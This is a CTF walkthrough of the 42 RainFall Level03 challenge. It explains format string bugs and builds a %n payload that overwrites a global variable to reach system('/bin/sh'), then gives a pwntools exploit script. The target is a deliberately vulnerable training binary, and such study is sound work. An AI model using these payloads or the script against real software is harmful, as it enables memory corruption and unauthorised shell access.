---
title: 42 RainFall Level03 - Walkthrough 🚀
tags:
  - cyber-security
  - rainfall
  - assembly
  - ctf
  - format-string
  - vulnerability
  - fmt-string
categories:
  - ctfs
  - 42project
date: 2025-02-23 10:41:02
---

# Welcome to RainFall

![rainfall](/images/rainfall.jpg)

# 🌊 Level03 of Rainfall Project 🌊

## 🔍 Introduction

Hello, today I'm gonna show you my read-me of the level03 of the rainfall project from 42 school.

## 👾 What is a "Format String" Vulnerability ?

A format string vulnerability is a `bug` where user input is passed as the format argument to printf, scanf, or another function in that family also called `variadic` functions.

The format argument has many different specifies which could allow an attack to leak data or write onto the stack if they control the format argument.

Today the vulnerability is demonstrate with printf but it is possible with all format variadic function.

Since printf and similar variadic functions, they will continue popping data off of the stack according to the format.

For example, if we can make the format argument "%x.%x.%x.%x", printf will pop off four stack values and print them in hexadecimal, potentially leaking sensitive information.

#### printf can also index to an arbitrary "argument" with the following syntax:
    - `%n$x` (where n is the decimal index of the argument you want)

While these bugs are powerful, they're very rare nowadays, as all modern compilers warn when printf is called with a non constant string.

So, to get back to the point the format string vulnerability allows us to read/write (which we'll see later) to the stack or to specific location in memory.

## 🔎 How to detect format string vulnerability ?

I'm going to suggest two methods for identifying a "Format String Vulnerability"

If we pass the binary to `objdump/r2/ghidra` at some point, you must see a call of a `printf/scanf` or any call of a variadic function where the argument is not a constant string and where the format is controlled by an input user entry.

## 🔬 Searching the vulnerability

If I execute the following command with objdump, we see that there are two interesting functions in the main binary, you should have the `v` and the `main` functions.

The objdump output should like this

```asm
080484a4 <v>:
 80484a4:	55                   	push   ebp
 80484a5:	89 e5                	mov    ebp,esp
 80484a7:	81 ec 18 02 00 00    	sub    esp,0x218
 80484ad:	a1 60 98 04 08       	mov    eax,ds:0x8049860
 80484b2:	89 44 24 08          	mov    DWORD PTR [esp+0x8],eax
 80484b6:	c7 44 24 04 00 02 00 	mov    DWORD PTR [esp+0x4],0x200
 80484bd:	00 
 80484be:	8d 85 f8 fd ff ff    	lea    eax,[ebp-0x208]
 80484c4:	89 04 24             	mov    DWORD PTR [esp],eax
 80484c7:	e8 d4 fe ff ff       	call   80483a0 <fgets@plt>
 80484cc:	8d 85 f8 fd ff ff    	lea    eax,[ebp-0x208]
 80484d2:	89 04 24             	mov    DWORD PTR [esp],eax
 80484d5:	e8 b6 fe ff ff       	call   8048390 <printf@plt>
 80484da:	a1 8c 98 04 08       	mov    eax,ds:0x804988c
 80484df:	83 f8 40             	cmp    eax,0x40
 80484e2:	75 34                	jne    8048518 <v+0x74>
 80484e4:	a1 80 98 04 08       	mov    eax,ds:0x8049880
 80484e9:	89 c2                	mov    edx,eax
 80484eb:	b8 00 86 04 08       	mov    eax,0x8048600
 80484f0:	89 54 24 0c          	mov    DWORD PTR [esp+0xc],edx
 80484f4:	c7 44 24 08 0c 00 00 	mov    DWORD PTR [esp+0x8],0xc
 80484fb:	00 
 80484fc:	c7 44 24 04 01 00 00 	mov    DWORD PTR [esp+0x4],0x1
 8048503:	00 
 8048504:	89 04 24             	mov    DWORD PTR [esp],eax
 8048507:	e8 a4 fe ff ff       	call   80483b0 <fwrite@plt>
 804850c:	c7 04 24 0d 86 04 08 	mov    DWORD PTR [esp],0x804860d
 8048513:	e8 a8 fe ff ff       	call   80483c0 <system@plt>
 8048518:	c9                   	leave
 8048519:	c3                   	ret

0804851a <main>:
 804851a:	55                   	push   ebp
 804851b:	89 e5                	mov    ebp,esp
 804851d:	83 e4 f0             	and    esp,0xfffffff0
 8048520:	e8 7f ff ff ff       	call   80484a4 <v>
 8048525:	c9                   	leave
 8048526:	c3                   	ret
```

The `main` function call the v function and if we look a little more closely at the `v` function we can see that:

```asm
080484a4 <v>:
 80484c7:	e8 d4 fe ff ff       	call   80483a0 <fgets@plt>
 80484cc:	8d 85 f8 fd ff ff    	lea    eax,[ebp-0x208]
 80484d2:	89 04 24             	mov    DWORD PTR [esp],eax
 80484d5:	e8 b6 fe ff ff       	call   8048390 <printf@plt>
```

Of course, in x86-32 bit mode arguments are passed through the stack, Okay so you remember the first argument of printf is always and must a `constant` string which represent a `format` but the problem here is the previous function call is `fgets` and as you can see the problem is also fgets read STDIN entry of the user and write the content of stdin into the buffer allocated on the stack I describe each instruction in the following Section.

### 🔬 Explaination of the problem

Look at this pieces of codes

```asm
080484a4 <v>:
 80484a4:	55                   	push   ebp
 80484a5:	89 e5                	mov    ebp,esp
 80484a7:	81 ec 18 02 00 00    	sub    esp,0x218
 80484ad:	a1 60 98 04 08       	mov    eax,ds:0x8049860
 80484b2:	89 44 24 08          	mov    DWORD PTR [esp+0x8],eax
 80484b6:	c7 44 24 04 00 02 00 	mov    DWORD PTR [esp+0x4],0x200
 80484bd:	00 
 80484be:	8d 85 f8 fd ff ff    	lea    eax,[ebp-0x208]
 80484c4:	89 04 24             	mov    DWORD PTR [esp],eax
 80484c7:	e8 d4 fe ff ff       	call   80483a0 <fgets@plt>
 80484cc:	8d 85 f8 fd ff ff    	lea    eax,[ebp-0x208]
 80484d2:	89 04 24             	mov    DWORD PTR [esp],eax
 80484d5:	e8 b6 fe ff ff       	call   8048390 <printf@plt>
```

So `push ebp` and `mov ebp, esp` is a creation of the stack frame so is the prologue of the function `v`.

The instruction `sub esp, 0x218` allocate some space on the stack, remember the stack is a LIFO (Last In first Out) and grows downward, So there we allocate 536 bytes `0x218` in hexadecimal.

Next you can see this following instruction `mov eax, ds:0x8049860`, at `0x8049860` is a constant provided by data segments `ds` and if we examine that in gdb you can see is just a `STDIN` so you know now this address is STDIN okay.

The following instruction is a parameters of `fgets` function remember the arguments is passed in reverse order so the arguments at `esp+0x8` is the third argument, second at `esp+0x4` is the second argument, and at the top of the stack so at `esp` (remember `esp` is the Stack pointer or top of the stack) so the first parameters is on top of the stack.

If we enter `man fgets` the prototype of the function is `char *fgets(char s[restrict .size], int size, FILE *restrict stream);`

So the parameters correspond perfectly.

After that, when the call to fgets is performed the fgets function return the buffer in `eax` register and as you can see the buffer is also put on top of the stack and pass directly to `printf`.

So you'r perfectly understand that pieces of code is vulnerable to format string vulnerability because you have an entry input user is directly pass as first argument to a `printf` function, which means that the user has the control over the program input, so if we run the program and just try to display four times `%x`.

see what happens

```sh
❯ ./level3
%x %x %x %x
200 f7e215c0 f7fddfd8 25207825
```

Cool we can now read on the stack !!!!

### 💻 Pseudo Code of the v function

for sipplicity sake, you can also decompile the binary with ghidra or IDA pro or binary ninja and look at the pseudo code part.

```c
void v(void)
{
    char buf [520];

    fgets(buf,0x200,stdin);
    printf(buf);
    if (m == 0x40) {
        fwrite("Wait what?!\n",1,0xc,stdout);
        system("/bin/sh");
    }
    return;
}
```

As I said above, you can see that printf is called directly with the buffer, which is transmited after user input.

We can also choose the value we want to display on the stack like this for example : 
    - `%2$x` 

This will take the second argument of printf and display it in hexadecimal format

```asm
❯ ./level3
%2$x %2$x %2$x %2$x 
f7e215c0 f7e215c0 f7e215c0 f7e215c0
```

As we can see the values are the same because we ask `printf` to display the same argumen
**4** times.

All right that's cool, we can read addresses from the stack, if the address point to a string we also replace the `%x` with `%s` which allows us to read a string.
Great but how can we write back to the stack or a variable or somewhere in the memory program ?

We need to use the `%n`, the `%n` writes the number of characters that printf succeeded in displaying.

we're going to test with the **level3** program, and if we look at it a little more closely we see that we have a symbols named `m` in the `.bss` section

Remember `.bss` is a section in ELF format which contains uninitialised data.

The `m` variable is a global variable, we can also see that with objdump command

```sh
$ objdump -t ./level3 | grep "m"
```

You should have this following output

```asm
./level3:     format de fichier elf32-i386
080481b8 l    d  .dynsym	00000000              .dynsym
08048618 l    d  .eh_frame_hdr	00000000              .eh_frame_hdr
08048654 l    d  .eh_frame	00000000              .eh_frame
0804974c l    d  .dynamic	00000000              .dynamic
00000000 l    d  .comment	00000000              .comment
08049884 l     O .bss	00000001              completed.6159
08048480 l     F .text	00000000              frame_dummy
08048734 l     O .eh_frame	00000000              __FRAME_END__
0804974c l     O .dynamic	00000000              _DYNAMIC
00000000       F *UND*	00000000              system@@GLIBC_2.0
00000000  w      *UND*	00000000              __gmon_start__
00000000       F *UND*	00000000              __libc_start_main@@GLIBC_2.0
0804988c g     O .bss	00000004              m
0804851a g     F .text	0000000d              main
```

So `m` is at address `0x0804988c` and reside in the `.bss` section

If we take our `v` function decompiled above, it would look like this

```c
void v(void)
{
    char buf [520];

    fgets(buf,0x200,stdin);
    printf(buf);
    
    if (m == 0x40) {
        fwrite("Wait what?!\n",1,0xc,stdout);
        system("/bin/sh");
    }
    
    return;
}
```
you can see that m must be equal to `0x40` which is `64` in decimal.

### ✏️  Writing our exploit and How write in M variable ?

1. Set `m` address on the stack.
2. Write the value `0x40` (64 in decimal) at `m` (`0x0804988c`) address with `%n`.
3. Trigger the condition `m == 0x40` and execute `system("/bin/sh")`.

We'll need to set the address of `m` on the stack, then choose the argument and write with `%n`, but first we'll need to determine where our buffer begins.

#### 📝 First determine where is our buffer

```python
$ python3 -c "import sys; sys.stdout.buffer.write(b'A'*4 + b' %p'*4)"
```

```sh
❯ python3 -c "import sys; sys.stdout.buffer.write(b'A'*4 + b' %p'*4)" | ./level3
AAAA 0x200 0xf7e215c0 0xf7f70fd8 0x41414141
```

As you can see, I've written A 4 times as the first argument in hexadecimal. This corresponds to 0x41414141, so we can determine that our buffer location is at index 4.

```sh
❯ python3 -c "import sys; sys.stdout.buffer.write(b'A'*4 + b' %4\$p')" | ./level3
AAAA 0x41414141
```

We can see that at index 4 our first parameter is still there, so we now know where we can write

#### 📝 Second write the data at m address


```sh
❯ python3 -c "import sys; sys.stdout.buffer.write(b'A'*4 + b' %4\$p')" | ./level3
AAAA 0x41414141
```

So were now going to put the address of `m` in the place of our 4's 'A' of course we're on x86-32 bit architecture and this CPU reads memory in little endian.

So you must convert your address to little endian, So that CPU can read correctly.

So `0x0804988c` in little Endian is `0x8c980408`

So if we replace the four bytes 'A' `0x41` you can get the correct address back


```sh
❯ python3 -c "import sys; sys.stdout.buffer.write(b'\x8c\x98\x04\x08' + b' %4\$p')" | ./level3
 0x804988c
 ```

##### 💡 Tricks to convert bytes to little-endian

```python
>>> from pwn import *
>>> import struct
>>> b'\x08\x04\x98\x8c'[::-1] == p32(0x0804988c) == struct.pack('<I', 0x0804988c)
True
```

The following methods are used to convert data to little-endian.
You can choose which method you method.

#### 🚀 Third Write the data

So, this is the final part of the exploit the writing data part.
We've put our address onto the stack but now we need to write `0x40` or 64 in decimal at `m` location.

`m` symbols is encoded on 4 bytes long and an address in x86 32 bits is 4 bytes.

As a remainder, the `%n` option counts the number of characters printed by `printf`.

If we want have 64 values at `m`, we must substract the length of the address passed as a parameter (here 4) so 64 - 4 is `60` in decimal so `0x3c` in hexadecimal `0x3c` is the remainder padding to write the correct values, so we'll just have to write 60 more characters

So the payload final should look like this

```sh
❯ python3 -c "import sys; sys.stdout.buffer.write(b'\x8c\x98\x04\x08' + b'A'*60 + b'%4\$n')" | ./level3
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAWait what?!
```

As you can see, we have succeeded to entering in the condition because we have the string "Wait what?!\n" displayed on the screen.

```c
void v(void)
{
    char buf [520];

    fgets(buf,0x200,stdin);
    printf(buf);
    if (m == 0x40) {
        // we are here
        fwrite("Wait what?!\n",1,0xc,stdout);
        system("/bin/sh");
    }
    return;
}
```

But we didn't get our shell back so we could keep our shell open like a cat or tail command.

So the final payload is that :

```sh
 ❯ (python3 -c "import sys; sys.stdout.buffer.write(b'\x8c\x98\x04\x08' + b'A'*60 + b'%4\$n')"; /bin/cat) | ./level3
```

```sh
❯ (python3 -c "import sys; sys.stdout.buffer.write(b'\x8c\x98\x04\x08' + b'A'*60 + b'%4\$n')"; /bin/cat) | ./level3

AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
Wait what?!
id
uid=1000(sam0verfl0w) gid=1000(sam0verfl0w) groupes=1000(sam0verfl0w),3(sys),963(docker),981(rfkill),998(wheel)
```

### 🕯️ Congratulations

Tada !!!
We Have our shell back and you can reach the flag ;)

You can also use the following script exploit with pwntools ;)

```python
#!/usr/bin/python3

import sys

try:
    from pwn import *
except ImportError as err:
    print(err)
    sys.exit(1)

OFFSET = 4

if __name__ == "__main__":

    if len(sys.argv) != 2:
        print('usage {} : <binary>'.format(sys.argv[0]))
        sys.exit(1)

    p = process(sys.argv[1])
    e = ELF(sys.argv[1])

    m_addr = e.symbols['m']
    payload = fmtstr_payload(OFFSET, {m_addr: 64})
    p.sendline(payload)
    p.interactive()
    p.close()
```

